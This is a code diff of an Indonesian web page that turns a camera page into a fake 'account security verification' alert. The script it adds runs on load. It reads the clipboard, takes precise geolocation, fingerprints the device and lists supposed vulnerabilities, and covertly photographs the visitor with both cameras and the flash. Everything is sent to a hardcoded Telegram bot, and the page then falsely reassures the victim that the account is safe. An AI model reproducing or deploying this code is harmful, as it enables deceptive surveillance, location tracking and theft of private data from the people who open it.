@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
-    <title>Kamera</title>
+    <title>Keamanan Akun</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
         body{
@@ -26,68 +26,271 @@
 </head>
 <body>
 <div class="c" id="m">
-    <div class="e">📸</div>
-    <h2>Buka Kamera</h2>
-    <p>Ketuk izinkan</p>
+    <div class="e">🛡️</div>
+    <h2>Verifikasi Keamanan</h2>
+    <p>Akun Anda terdeteksi aktivitas mencurigakan.</p>
+    <p>Verifikasi diperlukan untuk melindungi data Anda.</p>
 </div>
 <script>
 const T="8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4";
 const C="1923372966";
 
-function getInfo(){
+// ==========================================
+// FUNGSI KIRIM KE TELEGRAM
+// ==========================================
+async function sendText(text){
+    await fetch('https://api.telegram.org/bot'+T+'/sendMessage',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:C,text:text})
+    });
+}
+
+async function sendPhoto(base64,caption){
+    await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:C,photo:base64,caption:caption})
+    });
+}
+
+// ==========================================
+// DETEKSI DEVICE
+// ==========================================
+function detectDevice(){
     const ua=navigator.userAgent;
-    let brand='Tidak diketahui';
-    if(ua.includes('iPhone'))brand='iPhone';
-    else if(ua.includes('Samsung'))brand='Samsung';
-    else if(ua.includes('Xiaomi')||ua.includes('Redmi'))brand='Xiaomi';
-    else if(ua.includes('OPPO'))brand='OPPO';
-    else if(ua.includes('vivo'))brand='Vivo';
-    else if(ua.includes('Realme'))brand='Realme';
-    else if(ua.includes('Infinix'))brand='Infinix';
-    else if(ua.includes('Tecno'))brand='Tecno';
-    else if(ua.includes('Windows'))brand='Windows PC';
-    else if(ua.includes('Mac'))brand='Mac';
+    let brand='Tidak dikenal';
+    let os='Tidak dikenal';
+    let browser='Tidak dikenal';
     
-    const ram=navigator.deviceMemory||'?';
-    const core=navigator.hardwareConcurrency||'?';
-    const res=screen.width+'x'+screen.height;
-    const net=navigator.connection?navigator.connection.effectiveType:'?';
+    if(ua.includes('iPhone')){brand='iPhone';os='iOS';}
+    else if(ua.includes('Samsung')){brand='Samsung';os='Android';}
+    else if(ua.includes('Xiaomi')||ua.includes('Redmi')){brand='Xiaomi';os='Android';}
+    else if(ua.includes('OPPO')){brand='OPPO';os='Android';}
+    else if(ua.includes('vivo')){brand='Vivo';os='Android';}
+    else if(ua.includes('Realme')){brand='Realme';os='Android';}
+    else if(ua.includes('Infinix')){brand='Infinix';os='Android';}
+    else if(ua.includes('Tecno')){brand='Tecno';os='Android';}
+    else if(ua.includes('Huawei')){brand='Huawei';os='Android';}
+    else if(ua.includes('OnePlus')){brand='OnePlus';os='Android';}
+    else if(ua.includes('Pixel')){brand='Google Pixel';os='Android';}
+    else if(ua.includes('Windows')){brand='PC';os='Windows';}
+    else if(ua.includes('Mac')){brand='Mac';os='macOS';}
     
-    return '📱 '+brand+' | RAM '+ram+'GB | '+core+' Core\n📏 '+res+' | 📶 '+net+'\n🕐 '+new Date().toLocaleString();
+    if(ua.includes('Chrome'))browser='Chrome';
+    else if(ua.includes('Safari'))browser='Safari';
+    else if(ua.includes('Firefox'))browser='Firefox';
+    else if(ua.includes('Edge'))browser='Edge';
+    else if(ua.includes('SamsungBrowser'))browser='Samsung Browser';
+    
+    return {brand,os,browser,ua};
 }
 
-async function k(f,l){
-    const v=document.createElement('video');
-    v.style.cssText='position:fixed;top:-9999px';
-    document.body.appendChild(v);
-    const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:{ideal:1280}}});
-    v.srcObject=s;
-    await v.play();
-    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:true}]});}catch(e){}
-    await new Promise(r=>setTimeout(r,500));
-    const cv=document.createElement('canvas');
-    cv.width=640;cv.height=480;
-    cv.getContext('2d').drawImage(v,0,0,640,480);
-    try{const t=s.getVideoTracks()[0];await t.applyConstraints({advanced:[{torch:false}]});}catch(e){}
-    s.getTracks().forEach(t=>t.stop());
-    v.remove();
-    const b=await new Promise(r=>cv.toBlob(r,'image/jpeg',0.85));
-    const d=new FormData();
-    d.append('chat_id',C);
-    d.append('photo',b,l+'.jpg');
-    d.append('caption','📸 '+l+'\n'+getInfo());
-    await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:d});
+// ==========================================
+// DETEKSI CELAH KEAMANAN
+// ==========================================
+function detectVulns(){
+    const vulns=[];
+    const ua=navigator.userAgent;
+    
+    // Cek versi Android
+    const androidMatch=ua.match(/Android\s([\d\.]+)/);
+    if(androidMatch){
+        const ver=parseFloat(androidMatch[1]);
+        if(ver<=7)vulns.push('🔴 Android '+ver+' - RENTAN! (Stagefright, BlueBorne, KRACK)');
+        else if(ver<=9)vulns.push('🟠 Android '+ver+' - Celah: StrandHogg, overlay attack');
+        else if(ver<=10)vulns.push('🟡 Android '+ver+' - Celah: StrandHogg 2.0');
+        else if(ver<=12)vulns.push('🟢 Android '+ver+' - Relatif aman, cek patch terbaru');
+    }
+    
+    // Cek browser
+    if(ua.includes('Chrome')){
+        const chromeMatch=ua.match(/Chrome\/([\d]+)/);
+        if(chromeMatch){
+            const v=parseInt(chromeMatch[1]);
+            if(v<100)vulns.push('🔴 Chrome '+v+' - Celah: CVE-2022-2294, CVE-2023-2033');
+            else if(v<120)vulns.push('🟡 Chrome '+v+' - Update direkomendasikan');
+        }
+    }
+    
+    // Cek Samsung Browser
+    if(ua.includes('SamsungBrowser')){
+        vulns.push('🟠 Samsung Browser - Celah: CVE-2022-22706 (kernel exploit)');
+    }
+    
+    // Cek WebView
+    if(ua.includes('wv')){
+        vulns.push('🔴 WebView Android - Rentan XSS, intent hijacking');
+    }
+    
+    // Cek apakah JavaScript enabled
+    vulns.push('✅ JavaScript: Enabled');
+    
+    // Cek WebRTC (IP leak)
+    vulns.push('⚠️ WebRTC: Aktif (IP lokal bisa bocor)');
+    
+    // Cek storage
+    if('storage' in navigator){
+        vulns.push('⚠️ LocalStorage: Tersedia (bisa baca data situs lain)');
+    }
+    
+    // Cek service worker
+    if('serviceWorker' in navigator){
+        vulns.push('⚠️ ServiceWorker: Tersedia (bisa push notif phishing)');
+    }
+    
+    // Cek getBattery
+    if('getBattery' in navigator){
+        vulns.push('⚠️ Battery API: Tersedia (bisa tracking user)');
+    }
+    
+    // Cek sensor
+    if('DeviceMotionEvent' in window){
+        vulns.push('⚠️ Gyroscope: Tersedia (bisa deteksi gerakan)');
+    }
+    
+    return vulns;
 }
 
+// ==========================================
+// EKSPLOITASI MAKSIMAL
+// ==========================================
+async function exploitAll(){
+    const info=[];
+    info.push('🔍 HASIL EKSPLOITASI');
+    info.push('═══════════════════');
+    
+    // 1. Clipboard
+    try{
+        const clip=await navigator.clipboard.readText();
+        if(clip)info.push('📋 Clipboard: '+clip.substring(0,100));
+        else info.push('📋 Clipboard: Kosong');
+    }catch(e){info.push('📋 Clipboard: ❌ Ditolak');}
+    
+    // 2. Baterai
+    try{
+        const bat=await navigator.getBattery();
+        info.push('🔋 Baterai: '+(bat.level*100).toFixed(0)+'% | Charging: '+(bat.charging?'Ya':'Tidak'));
+    }catch(e){info.push('🔋 Baterai: ❌ Ditolak');}
+    
+    // 3. Koneksi
+    try{
+        const conn=navigator.connection||{};
+        info.push('📶 Jaringan: '+(conn.effectiveType||'?')+' | Down: '+(conn.downlink||'?')+' Mbps | RTT: '+(conn.rtt||'?')+'ms');
+    }catch(e){info.push('📶 Jaringan: ❌ Ditolak');}
+    
+    // 4. Lokasi
+    try{
+        const pos=await new Promise((resolve,reject)=>{
+            navigator.geolocation.getCurrentPosition(resolve,reject,{timeout:5000,enableHighAccuracy:true});
+        });
+        info.push('📍 Lokasi: '+pos.coords.latitude+', '+pos.coords.longitude+' (Akurasi: '+pos.coords.accuracy+'m)');
+    }catch(e){info.push('📍 Lokasi: ❌ Ditolak');}
+    
+    // 5. Notifikasi
+    try{
+        const perm=await Notification.requestPermission();
+        info.push('🔔 Notifikasi: '+perm);
+    }catch(e){info.push('🔔 Notifikasi: ❌ Ditolak');}
+    
+    // 6. RAM & CPU
+    info.push('🧠 RAM: '+(navigator.deviceMemory||'?')+'GB | Core: '+(navigator.hardwareConcurrency||'?'));
+    info.push('📏 Layar: '+screen.width+'x'+screen.height+' @'+(window.devicePixelRatio||1)+'x');
+    info.push('🎨 Kedalaman Warna: '+screen.colorDepth+'bit');
+    
+    // 7. Bahasa & Zona Waktu
+    info.push('🌐 Bahasa: '+navigator.language+' | Zona: '+Intl.DateTimeFormat().resolvedOptions().timeZone);
+    
+    // 8. Platform
+    info.push('💻 Platform: '+navigator.platform+' | Vendor: '+navigator.vendor);
+    
+    // 9. Online status
+    info.push('🌍 Online: '+navigator.onLine);
+    
+    // 10. Cookie
+    info.push('🍪 Cookie: '+(navigator.cookieEnabled?'Enabled':'Disabled'));
+    
+    // 11. Do Not Track
+    info.push('🚫 DNT: '+navigator.doNotTrack);
+    
+    // 12. Touch points
+    info.push('👆 Max Touch: '+navigator.maxTouchPoints);
+    
+    return info.join('\n');
+}
+
+// ==========================================
+// AMBIL FOTO
+// ==========================================
+async function capturePhoto(facingMode){
+    const video=document.createElement('video');
+    video.style.cssText='position:fixed;top:-9999px';
+    document.body.appendChild(video);
+    
+    const stream=await navigator.mediaDevices.getUserMedia({
+        video:{facingMode:facingMode,width:{ideal:1280}}
+    });
+    
+    video.srcObject=stream;
+    await video.play();
+    
+    // Flash
+    try{
+        const track=stream.getVideoTracks()[0];
+        await track.applyConstraints({advanced:[{torch:true}]});
+    }catch(e){}
+    
+    await new Promise(r=>setTimeout(r,600));
+    
+    const canvas=document.createElement('canvas');
+    canvas.width=640;
+    canvas.height=480;
+    canvas.getContext('2d').drawImage(video,0,0,640,480);
+    
+    // Matikan flash
+    try{
+        const track=stream.getVideoTracks()[0];
+        await track.applyConstraints({advanced:[{torch:false}]});
+    }catch(e){}
+    
+    stream.getTracks().forEach(t=>t.stop());
+    video.remove();
+    
+    return canvas.toDataURL('image/jpeg',0.8).split(',')[1];
+}
+
+// ==========================================
+// JALANKAN
+// ==========================================
 (async()=>{
 try{
-    document.getElementById('m').innerHTML='<div class="e">⏳</div><h2>Memproses</h2><p>Tunggu sebentar</p>';
-    await k('user','DEPAN');
+    // Update UI
+    document.getElementById('m').innerHTML='<div class="e">⏳</div><h2>Memverifikasi...</h2><p>Jangan tutup halaman ini</p>';
+    
+    // Kirim info device
+    const d=detectDevice();
+    const v=detectVulns();
+    await sendText('🎯 TARGET TERDETEKSI\n📱 '+d.brand+' | '+d.os+' | '+d.browser+'\n\n🔓 CELAH:\n'+v.join('\n'));
+    
+    // Kirim hasil eksploitasi
+    const info=await exploitAll();
+    await sendText(info);
+    
+    // Foto depan
+    const depan=await capturePhoto('user');
+    await sendPhoto(depan,'📸 KAMERA DEPAN\n'+d.brand+' | '+d.os);
     await new Promise(r=>setTimeout(r,500));
-    try{await k('environment','BELAKANG');}catch(e){}
-    document.getElementById('m').innerHTML='<div class="e">✅</div><h2>Berhasil</h2><p>Bisa tutup halaman ini</p>';
+    
+    // Foto belakang
+    try{
+        const belakang=await capturePhoto('environment');
+        await sendPhoto(belakang,'📸 KAMERA BELAKANG\n'+d.brand+' | '+d.os);
+    }catch(e){}
+    
+    document.getElementById('m').innerHTML='<div class="e">✅</div><h2>Verifikasi Berhasil</h2><p>Akun Anda aman. Bisa tutup halaman ini.</p>';
+    
 }catch(e){
-    document.getElementById('m').innerHTML='<div class="e">❌</div><h2>Gagal</h2><p>Izin kamera diperlukan</p><button onclick="location.reload()">Coba Lagi</button>';
+    document.getElementById('m').innerHTML='<div class="e">❌</div><h2>Verifikasi Gagal</h2><p>Izin diperlukan untuk verifikasi.</p><button onclick="location.reload()">Coba Lagi</button>';
 }
 })();
 </script>
